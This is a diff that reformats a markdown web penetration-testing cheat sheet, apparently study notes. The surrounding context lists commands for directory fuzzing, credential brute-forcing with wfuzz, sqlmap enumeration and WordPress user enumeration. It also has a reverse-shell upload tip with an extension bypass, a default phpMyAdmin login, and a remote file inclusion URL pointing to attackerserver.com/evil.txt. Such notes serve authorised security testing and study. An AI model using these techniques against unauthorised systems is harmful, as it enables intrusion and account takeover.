@@ -1,70 +1,70 @@
 # WEB
 
-### Use curl
+## Use curl
 
 ```shell
 curl <ip address/dns>
 ```
 
-### Scan for directories
+## Scan for directories
 
-[wfuzz](https://www.kali.org/tools/wfuzz/ "https://www.kali.org/tools/wfuzz/")
+[wfuzz](https://www.kali.org/tools/wfuzz/)
 
 ```
 wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 <url>/FUZZ
 ```
 
-[ffuf](https://www.kali.org/tools/ffuf/ "https://www.kali.org/tools/ffuf/")
+[ffuf](https://www.kali.org/tools/ffuf/)
 
 ```shell
 ffuf -w <wordlist> -u <url>/FUZZ
 ```
 
-[dirb](https://www.kali.org/tools/dirb/ "https://www.kali.org/tools/dirb/")
+[dirb](https://www.kali.org/tools/dirb/)
 
 ```shell
 dirb <url> <wordlist>
 ```
 
-[dirbuster](https://www.kali.org/tools/dirbuster/ "https://www.kali.org/tools/dirbuster/")
+[dirbuster](https://www.kali.org/tools/dirbuster/)
 
 ```shell
 java -jar DirBuster-1.0-RC1.jar -u <url>
 ```
 
-[gobuster](https://www.kali.org/tools/gobuster/ "https://www.kali.org/tools/gobuster/")
+[gobuster](https://www.kali.org/tools/gobuster/)
 
 ```shell
 gobuster -u <url> -w <wordlist> dir
 ```
 
-[nikto](https://www.kali.org/tools/nikto/ "https://www.kali.org/tools/nikto/")
+[nikto](https://www.kali.org/tools/nikto/)
 
 ```shell
 nikto -h <hostname> –output <filename>
 ```
 
-[dirsearch](https://www.kali.org/tools/dirsearch/ "https://www.kali.org/tools/dirsearch/")
+[dirsearch](https://www.kali.org/tools/dirsearch/)
 
 ```shell
 dirsearch -u <url>
 ```
 
-### Bruteforce subdomain
+## Bruteforce subdomain
 
-### Bruteforce credentials
+## Bruteforce credentials
 
-[wfuzz](https://www.kali.org/tools/wfuzz/ "https://www.kali.org/tools/wfuzz/")
+[wfuzz](https://www.kali.org/tools/wfuzz/)
 
 ```shell
 wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page path
 ```
 
-[BurpSuite — sniper/cluster bomb](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/attack-types "https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/attack-types")
+[BurpSuite — sniper/cluster bomb](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/attack-types)
 
-### SQL Injection
+## SQL Injection
 
-- [sqlmap](https://www.kali.org/tools/sqlmap/ "https://www.kali.org/tools/sqlmap/")
+- [sqlmap](https://www.kali.org/tools/sqlmap/)
 
     ```shell
     sqlmap -u <url> --dbs
@@ -178,27 +178,27 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
 
 - Using order by: <https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html>
 
-### XML External Entity (XXE)
+## XML External Entity (XXE)
 
-### URL vulnerability
+## URL vulnerability
 
-### OS command Injection
+## OS command Injection
 
-### Directory traversal
+## Directory traversal
 
-### Dotdotpwn tool
+## Dotdotpwn tool
 
-### Looking for:
+## Looking for:
 
 - .git
 
 - robots.txt
 
-### Set extension
+## Set extension
 
 - sh, txt, php, html, htm, asp, aspx, js, xml, log, json, jpg, jpeg, png, gif, doc, pdf, mpg, mp3, zip, tar.gz, tar
 
-### If https
+## If https
 
 - scan for heartbleed
 
@@ -212,9 +212,9 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
 
 - Read the certificate
 
-### If it's a CMS
+## If it's a CMS
 
-- Admin page
+-  Admin page
 
     - Joomla
 
@@ -227,7 +227,7 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
         - /wp-login
 
 - Wordpress
-    - [wpscan](https://www.kali.org/tools/wpscan/ "https://www.kali.org/tools/wpscan/")
+    - [wpscan](https://www.kali.org/tools/wpscan/)
 
     - ```shell
       wpscan -u <url> --enumerate -t --enumerate u --enumerate p
@@ -239,7 +239,7 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
       wpscan -u <url> --random-agent
       ```
 - Drupal
-    - [droopescan](https://github.com/SamJoan/droopescan "https://github.com/SamJoan/droopescan")
+    - [droopescan](https://github.com/SamJoan/droopescan)
 
     - `/CHANGELOG.txt` to find version
 
@@ -321,7 +321,7 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
 
     - /BackupCfg.html
 
-### Upload page
+## Upload page
 
 - Upload shell to make reverse shell
 
@@ -359,13 +359,13 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
 
         - `mv lo.jpg lo.php.jpg`
 
-### Phpmyadmin
+## Phpmyadmin
 
 - Default login `root:pma`
 
-### Identify WAF using `wafw00f`
+## Identify WAF using `wafw00f`
 
-### Exploitation
+## Exploitation
 
 - Heartbleed exploit
 
@@ -411,19 +411,19 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
 
     - `http://exampe.com/index.php?page=http://attackerserver.com/evil.txt`
 
-### Other
+## Other
 
-[cewl — Creating wordlist from webpage](https://www.kali.org/tools/cewl/ "https://www.kali.org/tools/cewl/")
+[cewl — Creating wordlist from webpage](https://www.kali.org/tools/cewl/)
 
-[EyeWitness](https://github.com/RedSiege/EyeWitness "https://github.com/RedSiege/EyeWitness") (take screenshots of websites)
+[EyeWitness](https://github.com/RedSiege/EyeWitness)
 
-[smbmap](https://www.kali.org/tools/smbmap/ "https://www.kali.org/tools/smbmap/")
+[smbmap](https://www.kali.org/tools/smbmap/)
 
 ```shell
 smbmap -H <hostname> [-u <user> -p <pass>]
 ```
 
-[smbclient](https://www.kali.org/tools/samba/#smbclient "https://www.kali.org/tools/samba/#smbclient")
+[smbclient](https://www.kali.org/tools/samba/#smbclient)
 
 ```shell
 smbclient -L //<a.b.c.d>/
